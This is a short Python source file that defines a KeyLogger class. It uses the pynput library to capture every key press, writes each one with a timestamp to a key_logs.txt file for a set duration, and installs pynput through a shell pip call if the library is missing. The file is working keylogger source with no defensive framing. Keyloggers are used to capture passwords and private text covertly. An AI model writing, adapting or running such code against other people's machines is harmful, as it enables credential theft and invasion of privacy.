try: 
    from pynput.keyboard import Key, Listener
    import logging 
    import os
    from threading import Timer

except ModuleNotFoundError:
    from subprocess import call
    call("pip install " + ' ' + 'pynput', shell=True)
    call("pip install " + ' ' + 'logging', shell=True)

class KeyLogger: 
    def __init__(self, duration, dir):
        self.duration = duration 
        self.filedir = str(dir + "\key_logs.txt")
        self.log = logging.basicConfig(filename = self.filedir, filemode='w', level = logging.DEBUG, format='%(asctime)s: %(message)s')

    def on_press(self,key): 
        logging.info(str(key))
    
    def run(self): 
        with Listener(on_press = self.on_press) as listener:
            Timer(self.duration, listener.stop).start()
            listener.join()


    
